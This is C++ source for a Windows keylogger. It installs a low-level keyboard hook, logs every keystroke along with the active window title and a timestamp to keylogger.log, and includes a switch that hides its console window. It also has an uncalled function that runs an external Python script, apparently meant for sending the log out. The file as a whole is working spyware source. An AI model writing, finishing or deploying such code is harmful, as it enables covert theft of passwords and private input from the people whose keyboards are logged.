#define UNICODE
#include <Windows.h>
#include <cstring>
#include <cstdio>
#include <conio.h> 
#include <csignal>
#include <fstream>
#include <iostream>
#include <sstream>
#include <time.h>
#include <map>
#include <cstdlib>
#include <chrono>
#include <thread>
#define visible  
#define FORMAT 0
#define mouseignore
#if FORMAT == 0
const std::map<int, std::string> keyname{ 
	{VK_BACK, "[BACKSPACE]" },
	{VK_SPACE,	"_" },
	{VK_TAB,	"[TAB]" },
	{VK_SHIFT,	"[SHIFT]" },
	{VK_LSHIFT,	"[LSHIFT]" },
	{VK_RSHIFT,	"[RSHIFT]" },
	{VK_CONTROL,	"[CONTROL]" },
	{VK_LCONTROL,	"[LCONTROL]" },
	{VK_RCONTROL,	"[RCONTROL]" },
	{VK_MENU,	"[ALT]" },
	{VK_LWIN,	"[LWIN]" },
	{VK_RWIN,	"[RWIN]" },
	{VK_ESCAPE,	"[ESCAPE]" },
	{VK_END,	"[END]" },
	{VK_HOME,	"[HOME]" },
	{VK_LEFT,	"[LEFT]" },
	{VK_RIGHT,	"[RIGHT]" },
	{VK_UP,		"[UP]" },
	{VK_DOWN,	"[DOWN]" },
	{VK_PRIOR,	"[PG_UP]" },
	{VK_NEXT,	"[PG_DOWN]" },
	{VK_OEM_PERIOD,	"." },
	{VK_DECIMAL,	"." },
	{VK_OEM_PLUS,	"+" },
	{VK_OEM_MINUS,	"-" },
	{VK_ADD,		"+" },
	{VK_SUBTRACT,	"-" },
	{VK_CAPITAL,	"[CAPSLOCK]" },
};
#endif
HHOOK _hook;

 
KBDLLHOOKSTRUCT kbdStruct;	

int Save(int key_stroke);
std::ofstream output_file;

 
LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode >= 0)
	{
		 
		if (wParam == WM_KEYDOWN)
		{
			 
			kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);

			 
			Save(kbdStruct.vkCode);
		}
	}

	 
	return CallNextHookEx(_hook, nCode, wParam, lParam);
}

void SetHook()
{
	 
	if (!(_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0)))
	{
		LPCWSTR a = L"Failed to install hook!";
		LPCWSTR b = L"Error";
		MessageBox(NULL, a, b, MB_ICONERROR);
	}
}

void ReleaseHook()
{
	UnhookWindowsHookEx(_hook);
}


int Save(int key_stroke)
{
	std::stringstream output;
	static char lastwindow[256] = "";
#ifndef mouseignore 
	if ((key_stroke == 1) || (key_stroke == 2))
	{
		return 0; 
	}
#endif
	HWND foreground = GetForegroundWindow();
	DWORD threadID;
	HKL layout = NULL;

	if (foreground)
	{
		
		threadID = GetWindowThreadProcessId(foreground, NULL);
		layout = GetKeyboardLayout(threadID);
	}

	if (foreground)
	{
		char window_title[256];
		GetWindowTextA(foreground, (LPSTR)window_title, 256);

		if (strcmp(window_title, lastwindow) != 0)
		{
			strcpy(lastwindow, window_title);
           
            struct tm* tm_info;
            time_t t = time(NULL);
            tm_info = localtime(&t);
            char s[64];
            strftime(s, sizeof(s), "%FT%X%z", tm_info);


			output << "\n\n[Window: " << window_title << " - at " << s << "] ";
		}
	}

#if FORMAT == 10
	output << '[' << key_stroke << ']';
#elif FORMAT == 16
	output << std::hex << "[" << key_stroke << ']';
#else
	if (keyname.find(key_stroke) != keyname.end())
	{
		output << keyname.at(key_stroke);
	}
	else
	{
		char key;
		
		bool lowercase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);

		
		if ((GetKeyState(VK_SHIFT) & 0x1000) != 0 || (GetKeyState(VK_LSHIFT) & 0x1000) != 0
			|| (GetKeyState(VK_RSHIFT) & 0x1000) != 0)
		{
			lowercase = !lowercase;
		}

		
		key = MapVirtualKeyExA(key_stroke, MAPVK_VK_TO_CHAR, layout);

		
		if (!lowercase)
		{
			key = tolower(key);
		}
		output << char(key);
	}
#endif
	
	output_file << output.str();
	output_file.flush();

	std::cout << output.str();

	return 0;
}
void Stealth()
{
#ifdef visible
	ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 1); 
#endif

#ifdef invisible
	ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0); 
#endif
}

 
	int connection() {
    // Run the Python script
    if (system("python import.py") != 0) {
        return 1;  // Handle execution error
    }

    return 0;
}



using namespace std;

int main()
{
	
	

	
	const char* output_filename = "keylogger.log";
	std::cout << "Logging output to " << output_filename << std::endl;
	output_file.open(output_filename, std::ios_base::app);

	
	Stealth();
	SetHook();

	string inputBuffer;

	
	MSG msg;

	
	 
	while (GetMessage(&msg, NULL, 0, 0))
	{	
		
	TranslateMessage(&msg);
    DispatchMessage(&msg);

    // Check if the Enter key is pressed
    if (msg.wParam == VK_RETURN)
    {
        break; // Exit the loop if Enter key is pressed
    

	ReleaseHook();
    output_file.close();
	}
	}

	
	
    return 0;
}







